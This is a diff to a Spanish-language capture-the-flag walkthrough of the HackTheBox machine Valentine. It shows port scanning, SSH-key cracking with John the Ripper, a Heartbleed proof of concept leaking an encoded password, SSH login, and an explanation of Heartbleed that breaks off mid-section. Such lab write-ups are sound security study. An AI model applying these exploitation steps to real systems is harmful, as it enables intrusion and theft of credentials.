@@ -4,7 +4,8 @@
 
 --------------
 
-1. Escaneo de puertos:
+## Part 1. Escaneo de puertos:
+
 ```console
 └─$ nmap -sCV -T5 10.10.10.79 -Pn -v
 Discovered open port 443/tcp on 10.10.10.79
@@ -23,6 +24,10 @@ https://10.10.10.79 [200 OK] Apache[2.2.22], HTTPServer[Ubuntu Linux][Apache/2.2
 ```
 La peticion por el puerto 443 da error, pero el escaneo reporta que la web se llama Valentine.htb, asi que se añade al /etc/hosts la linea
 ```10.10.10.79	valentine.htb```
+
+-----------------------
+## Part 2: Analizando la web
+
 La web tiene una foto:
 ![Captura](https://user-images.githubusercontent.com/96772264/200539814-b265a913-3729-4f6c-a6d3-c16224df9d69.PNG)
 
@@ -64,6 +69,9 @@ No tenemos la contraseña pero se pued intentar crackear la llave:
 └─$ python3 /usr/share/john/ssh2john.py id_rsa > hash
 └─$ john hash -w=/usr/share/wordlists/rockyou.txt
 ```
+-----------------------
+## Part 3: Heartbleed
+
 Pero no obtenemos contraseña, tiramos de nmap para que nos busque vulnerabilidades.
 ```console
 └─$ nmap -T5 10.10.10.79 -script vuln  
@@ -81,18 +89,30 @@ Este exploit no me ha sacado nada interesante, pero he encontrado otro:
 ```https://github.com/mpgn/heartbleed-PoC```
 ```console
 └─$ python2 heartbleed-exploit.py 10.10.10.79
+Connecting...
+Sending Client Hello...
+ ... received message: type = 22, ver = 0302, length = 66
+Handshake done...
+Sending heartbeat request with length 4 :
+ ... received message: type = 24, ver = 0302, length = 16384
+Received heartbeat response in file out.txt
+WARNING : server returned more data than it should - server is vulnerable!
 └─$ cat out.txt | xxd -r
 ```
-Nada interesante.
+Nada interesante. Hay que ejecutarlo varias veces...
 A la segunda vez nos leakea esto: ```$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=``` Como la cadena son letras, 
 numeros y un "=" suponemos que es base64
 ```console
 └─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=" | base64  -d
 heartbleedbelievethehype
 ```
-Parece la contraseña de ssh, el asunto es que ha sido un base64 porque supongo que el creador de la ma quinahabra utilizado su porpia herramienta /decode para
-"cifrar" la contraseña.
+Parece la contraseña de ssh, el asunto es que ha sido un base64 porque supongo que el creador de la ma quinahabra utilizado su porpia herramienta 
+/decode para "cifrar" la contraseña.
 Como la llave era hype_key, podemos entrar con ese usuario:
+
+-----------------------
+## Part 4: Entrando en el sistema
+
 ```console
 └─$ ssh -i id_rsa hype@10.10.10.79;
 ```
@@ -114,28 +134,28 @@ teniendo esa consola de root.
 
 --------------------------------------------
 
-## Heartbleed
+## Extra: Heartbleed
 
-"Corazon sangrante" es una vulnerabilidad que afecta a "OpenSSl 1.0.1 a 1.0.1f"  
+"Corazon sangrante" es una vulnerabilidad que afecta a "OpenSSl 1.0.1 a 1.0.1f"    
 Los Cetificados SSL están creados para encriptar las conexiones del protocolo https (por lo que la data que se envia se hace ilegible (encriptada)).    
-Paralelamente a esta conexion esta el HEARTBEAT, un reconocimiento que hace el cliente con el servidor para decirle que la conexion sigue abierta: le dice una
-palabra y le pide que se la repita (y como esto no es confidencial no se encripta)  
+Paralelamente a esta conexion esta el HEARTBEAT, un reconocimiento que hace el cliente con el servidor para decirle que la conexion sigue abierta: 
+le dice una palabra y le pide que se la repita (y como esto no es confidencial no se encripta)    
 
-han llamado "Latido de corazon" porque son dos golpes (pregunta-respuesta)  
-Heartbeat normal (latido):   
+han llamado "Latido de corazon" porque son dos golpes (pregunta-respuesta)    
+Heartbeat normal (latido):     
 ```
 cliente: "SI ESTAS AHI MANDAME LA PALABRA 'PATATA', (6letras)".
 servidor: "PATATA"
 ```
-El problema con Heartbleed esque le podemos decir que la respuesta sea mas larga que lo esperado.  
+El problema con Heartbleed esque le podemos decir que la respuesta sea mas larga que lo esperado.    
 
 ```
 cliente: "SI ESTAS AHI MANDAME LA PALABRA 'PATATA', (600letras)".
 servidor: "PATATA, pero como me has pedido 600 letras te contare muchas cosas interesantes más"```
 ```
-Aqui se leakea los datos de la conexion https pero sin encriptar (ya que estos se guardan en la memoria y le hemos hecho sangrar esta misma con la respuesta 
-MAS LARGA DE LO NORMAL)
-Leyendo el exploit, nos dice que una peticion HEARTBEAT es tal que asi:
+Aqui se leakea los datos de la conexion https pero sin encriptar (ya que estos se guardan en la memoria y le hemos hecho sangrar esta misma con 
+la respuesta MAS LARGA DE LO NORMAL)  
+Leyendo el exploit, nos dice que una peticion HEARTBEAT es tal que asi:  
 ```
 HEADERS:
 18 -> Numero que indica que esto es un paquete Heartbeat
